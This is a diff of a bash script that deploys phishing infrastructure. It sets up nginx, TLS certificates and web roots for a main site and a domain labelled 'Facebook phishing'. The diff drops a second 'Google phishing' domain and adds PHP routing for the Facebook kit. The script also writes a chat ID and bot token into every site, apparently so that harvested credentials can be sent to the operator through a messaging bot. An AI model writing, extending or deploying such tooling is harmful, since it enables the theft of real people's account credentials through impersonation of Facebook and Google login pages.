@@ -2,35 +2,30 @@
 
 # Check if all 3 domain parameters are provided
 if [ -z "$1" ] || [ -z "$2" ] || [ -z "$3" ]; then
-    echo "Usage: $0 <main_domain> <facebook_domain> <google_domain> [chat_id] [bot_token]"
-    echo "Example: $0 example.com facebook-phish.com google-phish.com 123456789 your_bot_token"
+    echo "Usage: $0 <main_domain> <facebook_domain> [chat_id] [bot_token]"
+    echo "Example: $0 example.com facebook-phish.com 123456789 your_bot_token"
     echo "This will setup 3 separate domains:"
     echo "  - Main site: <main_domain> (main folder)"
     echo "  - Facebook phishing: <facebook_domain> (facebook folder)"
-    echo "  - Google phishing: <google_domain> (google folder)"
     exit 1
 fi
 
 MAIN_DOMAIN=$1
 FB_DOMAIN=$2
-GG_DOMAIN=$3
-CHAT_ID=$4
-TOKEN=$5
+CHAT_ID=$3
+TOKEN=$4
 
 # Add www versions
 MAIN_WWW="www.$MAIN_DOMAIN"
 FB_WWW="www.$FB_DOMAIN"
-GG_WWW="www.$GG_DOMAIN"
 
 # Nginx config paths
 MAIN_NGINX="/etc/nginx/sites-available/$MAIN_DOMAIN"
 FB_NGINX="/etc/nginx/sites-available/$FB_DOMAIN"
-GG_NGINX="/etc/nginx/sites-available/$GG_DOMAIN"
 
 # Web root paths
 MAIN_ROOT="/var/www/html/$MAIN_DOMAIN"
 FB_ROOT="/var/www/html/$FB_DOMAIN"
-GG_ROOT="/var/www/html/$GG_DOMAIN"
 
 echo "Stopping Nginx..."
 sudo systemctl stop nginx
@@ -61,13 +56,7 @@ else
     sudo certbot certonly --standalone -d $FB_DOMAIN -d $FB_WWW
 fi
 
-# SSL for Google domain
-if [ -d "/etc/letsencrypt/live/$GG_DOMAIN" ]; then
-    echo "SSL certificate already exists for $GG_DOMAIN"
-else
-    echo "Getting SSL certificate for Google domain: $GG_DOMAIN and $GG_WWW..."
-    sudo certbot certonly --standalone -d $GG_DOMAIN -d $GG_WWW
-fi
+
 
 # Create web root directories for all sites
 echo "Creating web root directories..."
@@ -92,15 +81,7 @@ else
     sudo chmod -R 755 $FB_ROOT
 fi
 
-# Google site
-if [ ! -d "$GG_ROOT" ]; then
-    sudo mkdir -p $GG_ROOT
-    sudo chmod -R 755 $GG_ROOT
-else
-    sudo rm -rf $GG_ROOT
-    sudo mkdir -p $GG_ROOT
-    sudo chmod -R 755 $GG_ROOT
-fi
+
 
 # Copy entire source to all sites (shared source code)
 if [ -d "/var/www/html/source" ]; then
@@ -112,8 +93,7 @@ if [ -d "/var/www/html/source" ]; then
     # Copy all source files to facebook site  
     sudo cp -r /var/www/html/source/* $FB_ROOT/ 2>/dev/null || true
     
-    # Copy all source files to google site
-    sudo cp -r /var/www/html/source/* $GG_ROOT/ 2>/dev/null || true
+
 fi
 
 
@@ -122,28 +102,23 @@ if [ ! -z "$CHAT_ID" ]; then
     echo "Writing chat ID to all sites..."
     echo "$CHAT_ID" | sudo tee $MAIN_ROOT/chat-id.txt > /dev/null
     echo "$CHAT_ID" | sudo tee $FB_ROOT/chat-id.txt > /dev/null
-    echo "$CHAT_ID" | sudo tee $GG_ROOT/chat-id.txt > /dev/null
     sudo chmod 644 $MAIN_ROOT/chat-id.txt
     sudo chmod 644 $FB_ROOT/chat-id.txt
-    sudo chmod 644 $GG_ROOT/chat-id.txt
 fi
 
 if [ ! -z "$TOKEN" ]; then
     echo "Writing token to all sites..."
     echo "$TOKEN" | sudo tee $MAIN_ROOT/token.txt > /dev/null
     echo "$TOKEN" | sudo tee $FB_ROOT/token.txt > /dev/null
-    echo "$TOKEN" | sudo tee $GG_ROOT/token.txt > /dev/null
     sudo chmod 644 $MAIN_ROOT/token.txt
     sudo chmod 644 $FB_ROOT/token.txt
-    sudo chmod 644 $GG_ROOT/token.txt
 fi
 
 # Remove old config files
 echo "Removing old nginx configurations..."
-sudo rm -f $MAIN_NGINX $FB_NGINX $GG_NGINX
+sudo rm -f $MAIN_NGINX $FB_NGINX
 sudo rm -f /etc/nginx/sites-enabled/$MAIN_DOMAIN
 sudo rm -f /etc/nginx/sites-enabled/$FB_DOMAIN  
-sudo rm -f /etc/nginx/sites-enabled/$GG_DOMAIN
 
 # Create Nginx configuration for main site
 echo "Creating Nginx configuration for main site ($MAIN_DOMAIN)..."
@@ -193,43 +168,18 @@ server {
     ssl_certificate /etc/letsencrypt/live/$FB_DOMAIN/fullchain.pem;
     ssl_certificate_key /etc/letsencrypt/live/$FB_DOMAIN/privkey.pem;
 
-    root $FB_ROOT;
+    root $FB_ROOT/facebook;
     index index.html index.htm index.php;
 
     location / {
-        try_files \$uri \$uri/ =404;
+        try_files $uri $uri/ @to_php;
     }
 
-    location ~ \.php$ {
-        include snippets/fastcgi-php.conf;
-        fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;
-        fastcgi_param SCRIPT_FILENAME \$document_root\$fastcgi_script_name;
-        include fastcgi_params;
-    }
-}
-EOF
-
-# Create Nginx configuration for Google site
-echo "Creating Nginx configuration for Google site ($GG_DOMAIN)..."
-sudo tee $GG_NGINX > /dev/null << EOF
-server {
-    listen 80;
-    server_name $GG_DOMAIN $GG_WWW;
-    return 301 https://\$host\$request_uri;
-}
-
-server {
-    listen 443 ssl;
-    server_name $GG_DOMAIN $GG_WWW;
-
-    ssl_certificate /etc/letsencrypt/live/$GG_DOMAIN/fullchain.pem;
-    ssl_certificate_key /etc/letsencrypt/live/$GG_DOMAIN/privkey.pem;
-
-    root $GG_ROOT;
-    index index.html index.htm index.php;
-
-    location / {
-        try_files \$uri \$uri/ =404;
+    location @to_php {
+        if (-f $document_root$uri.php) {
+            rewrite ^ /$uri.php last;
+        }
+        return 404;
     }
 
     location ~ \.php$ {
@@ -245,7 +195,6 @@ EOF
 echo "Creating symbolic links..."
 sudo ln -sf $MAIN_NGINX /etc/nginx/sites-enabled/$MAIN_DOMAIN
 sudo ln -sf $FB_NGINX /etc/nginx/sites-enabled/$FB_DOMAIN
-sudo ln -sf $GG_NGINX /etc/nginx/sites-enabled/$GG_DOMAIN
 
 # Test Nginx configuration
 echo "Testing Nginx configuration..."
@@ -258,7 +207,6 @@ sudo systemctl restart nginx
 echo "Setup completed for all 3 domains!"
 echo "✅ Main site: https://$MAIN_DOMAIN"
 echo "✅ Facebook phishing: https://$FB_DOMAIN"
-echo "✅ Google phishing: https://$GG_DOMAIN"
 
 if [ ! -z "$CHAT_ID" ]; then
     echo "📱 Chat ID written to all sites"
@@ -272,5 +220,4 @@ echo ""
 echo "🌐 Test your sites:"
 echo "   curl -I https://$MAIN_DOMAIN"
 echo "   curl -I https://$FB_DOMAIN" 
-echo "   curl -I https://$GG_DOMAIN"
 
